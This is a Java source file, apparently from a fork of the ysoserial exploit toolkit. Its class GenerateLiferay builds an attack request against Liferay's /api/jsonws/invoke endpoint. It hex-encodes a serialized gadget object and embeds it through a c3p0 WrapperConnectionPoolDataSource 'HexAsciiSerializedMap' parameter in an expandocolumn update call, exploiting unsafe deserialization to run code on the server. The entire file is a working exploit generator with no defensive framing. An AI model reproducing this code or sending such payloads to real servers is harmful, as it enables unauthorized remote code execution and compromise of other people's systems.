package ysoserial.features;

import com.mchange.v2.ser.SerializableUtils;
import org.apache.commons.codec.binary.Hex;

import javax.xml.bind.DatatypeConverter;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.zip.GZIPOutputStream;

public class GenerateLiferay {
    public static String sendpayload(Object payload) throws Exception {
        // 1. payload to writeObject
        byte[] serpayload = SerializableUtils.toByteArray(payload);

        String hexdata = Hex.encodeHexString(serpayload);
        System.out.println("[POST] /api/jsonws/invoke");
        // return hexdata;
        return "cmd=%7B%22%2Fexpandocolumn%2Fupdate-column%22%3A%7B%7D%7D&formDate=1585646146787&columnId=1&name=1&type=1&%2bdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\"userOverridesAsString\":\"HexAsciiSerializedMap:" +
                hexdata + ";\"}";
    }
}
